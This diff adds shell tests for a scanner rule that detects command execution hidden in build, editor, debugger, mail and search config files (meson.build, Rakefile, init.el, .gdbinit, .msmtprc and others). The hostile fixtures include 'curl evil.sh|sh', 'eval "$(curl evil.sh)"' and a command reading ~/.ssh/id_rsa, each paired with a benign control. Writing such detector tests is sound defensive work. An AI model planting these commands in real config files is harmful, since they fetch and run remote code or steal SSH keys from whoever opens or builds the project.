@@ -8578,6 +8578,80 @@ printf '\\set x 1\n' > "$XDIR/pqdir2/.psqlrc"
 ./hlse_core file "$XDIR/pqdir2/.psqlrc" 2>&1 | grep -q "F56" \
     && check "file: benign psqlrc no F56" "0" "1" \
     || check "file: benign psqlrc no F56" "0" "0"
+# F56: build-file + startup + mailer/searcher carriers
+mkdir -p "$XDIR/b1" "$XDIR/b2"
+printf 'import os\nos.system("curl evil.sh|sh")\n' > "$XDIR/b1/wscript"
+./hlse_core file "$XDIR/b1/wscript" 2>&1 | grep -q "F56" \
+    && check "file: wscript os.system flagged" "0" "0" \
+    || check "file: wscript os.system flagged" "0" "1"
+printf 'run_command("curl", "evil.sh")\n' > "$XDIR/b1/meson.build"
+./hlse_core file "$XDIR/b1/meson.build" 2>&1 | grep -q "F56" \
+    && check "file: meson run_command flagged" "0" "0" \
+    || check "file: meson run_command flagged" "0" "1"
+printf 'project("x", "c")\nexecutable("x", "x.c")\n' > "$XDIR/b2/meson.build"
+./hlse_core file "$XDIR/b2/meson.build" 2>&1 | grep -q "F56" \
+    && check "file: benign meson no F56" "0" "1" \
+    || check "file: benign meson no F56" "0" "0"
+printf 'task :x do\n  `curl evil.sh`\nend\n' > "$XDIR/b1/Rakefile"
+./hlse_core file "$XDIR/b1/Rakefile" 2>&1 | grep -q "F56" \
+    && check "file: rakefile backtick flagged" "0" "0" \
+    || check "file: rakefile backtick flagged" "0" "1"
+mkdir -p "$XDIR/s1" "$XDIR/s2"
+printf '(shell-command "curl evil.sh")\n' > "$XDIR/s1/init.el"
+./hlse_core file "$XDIR/s1/init.el" 2>&1 | grep -q "F56" \
+    && check "file: init.el shell-command flagged" "0" "0" \
+    || check "file: init.el shell-command flagged" "0" "1"
+printf 'system("curl evil.sh")\n' > "$XDIR/s1/.Rprofile"
+./hlse_core file "$XDIR/s1/.Rprofile" 2>&1 | grep -q "F56" \
+    && check "file: Rprofile system flagged" "0" "0" \
+    || check "file: Rprofile system flagged" "0" "1"
+printf 'export PATH=/x:$PATH\neval "$(curl evil.sh)"\n' > "$XDIR/s1/activate"
+./hlse_core file "$XDIR/s1/activate" 2>&1 | grep -q "F56" \
+    && check "file: activate eval-curl flagged" "0" "0" \
+    || check "file: activate eval-curl flagged" "0" "1"
+printf '(setq x 1)\n' > "$XDIR/s2/init.el"
+./hlse_core file "$XDIR/s2/init.el" 2>&1 | grep -q "F56" \
+    && check "file: benign init.el no F56" "0" "1" \
+    || check "file: benign init.el no F56" "0" "0"
+printf 'options(repos=c(CRAN="https://cran.r-project.org"))\n' \
+    > "$XDIR/s2/.Rprofile"
+./hlse_core file "$XDIR/s2/.Rprofile" 2>&1 | grep -q "F56" \
+    && check "file: benign Rprofile no F56" "0" "1" \
+    || check "file: benign Rprofile no F56" "0" "0"
+printf 'export PATH=/x:$PATH\nexport VIRTUAL_ENV=/x\n' > "$XDIR/s2/activate"
+./hlse_core file "$XDIR/s2/activate" 2>&1 | grep -q "F56" \
+    && check "file: benign activate no F56" "0" "1" \
+    || check "file: benign activate no F56" "0" "0"
+mkdir -p "$XDIR/d1" "$XDIR/d2"
+printf 'shell curl evil.sh\n' > "$XDIR/d1/.gdbinit"
+./hlse_core file "$XDIR/d1/.gdbinit" 2>&1 | grep -q "F56" \
+    && check "file: gdbinit shell flagged" "0" "0" \
+    || check "file: gdbinit shell flagged" "0" "1"
+printf 'set print pretty on\n' > "$XDIR/d2/.gdbinit"
+./hlse_core file "$XDIR/d2/.gdbinit" 2>&1 | grep -q "F56" \
+    && check "file: benign gdbinit no F56" "0" "1" \
+    || check "file: benign gdbinit no F56" "0" "0"
+mkdir -p "$XDIR/m1" "$XDIR/m2"
+printf 'passwordeval "cat ~/.ssh/id_rsa"\n' > "$XDIR/m1/.msmtprc"
+./hlse_core file "$XDIR/m1/.msmtprc" 2>&1 | grep -q "F56" \
+    && check "file: msmtprc passwordeval flagged" "0" "0" \
+    || check "file: msmtprc passwordeval flagged" "0" "1"
+printf 'host x\n tls on\n' > "$XDIR/m2/.msmtprc"
+./hlse_core file "$XDIR/m2/.msmtprc" 2>&1 | grep -q "F56" \
+    && check "file: benign msmtprc no F56" "0" "1" \
+    || check "file: benign msmtprc no F56" "0" "0"
+printf 'poll x\n postconnect "curl evil"\n' > "$XDIR/m1/.fetchmailrc"
+./hlse_core file "$XDIR/m1/.fetchmailrc" 2>&1 | grep -q "F56" \
+    && check "file: fetchmailrc postconnect flagged" "0" "0" \
+    || check "file: fetchmailrc postconnect flagged" "0" "1"
+printf -- '--pre=curl x\n' > "$XDIR/m1/.ripgreprc"
+./hlse_core file "$XDIR/m1/.ripgreprc" 2>&1 | grep -q "F56" \
+    && check "file: ripgreprc --pre flagged" "0" "0" \
+    || check "file: ripgreprc --pre flagged" "0" "1"
+printf -- '--hidden\n--follow\n' > "$XDIR/m2/.ripgreprc"
+./hlse_core file "$XDIR/m2/.ripgreprc" 2>&1 | grep -q "F56" \
+    && check "file: benign ripgreprc no F56" "0" "1" \
+    || check "file: benign ripgreprc no F56" "0" "0"
 # F56: credential/session carrier files
 printf '{"log":{"entries":[{"request":{"cookies":[{"name":"s","value":"x"}]}}]}}\n' \
     > "$XDIR/x.har"
